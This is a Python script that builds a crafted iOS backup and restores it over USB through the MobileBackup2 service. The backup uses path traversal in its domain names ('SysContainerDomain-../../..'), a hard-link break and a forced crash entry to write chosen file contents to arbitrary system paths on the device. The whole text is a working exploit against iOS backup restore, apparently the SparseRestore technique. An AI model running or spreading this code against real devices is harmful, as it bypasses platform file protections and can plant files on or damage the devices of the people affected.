from sparserestore import backup
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.mobilebackup2 import Mobilebackup2Service
from tempfile import TemporaryDirectory
from pathlib import Path

def restore_file(fp: str, restore_path: str, restore_name: str):
    contents = open(fp, 'rb').read()
    back = backup.Backup(
        files=[
            backup.Directory("", "RootDomain"),
            backup.Directory("Library", "RootDomain"),
            backup.Directory("Library/Preferences", "RootDomain"),
            backup.ConcreteFile("Library/Preferences/temp", "RootDomain", owner=33, group=33, contents=contents, inode=0),
            backup.Directory(
                "",
                f"SysContainerDomain-../../../../../../../..{restore_path}",
                owner=33,
                group=33,
            ),
            backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../..{restore_path}/{restore_name}",
                owner=33,
                group=33,
                contents=b"",
                inode=0,
            ),
            backup.ConcreteFile(
                "",
                "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
                owner=501,
                group=501,
                contents=b"",
            ),  # Break the hard link
            backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
        ]
    )
    with TemporaryDirectory() as backup_dir:
        backup_dir_path = Path(backup_dir)
        back.write_to_directory(backup_dir_path)
        print(f'Backup written to {backup_dir}')
        input('Press Enter to continue...')
        lockdown = create_using_usbmux()
        with Mobilebackup2Service(lockdown) as mb:
            mb.restore(backup_dir, system=True, reboot=False, copy=False, source='.')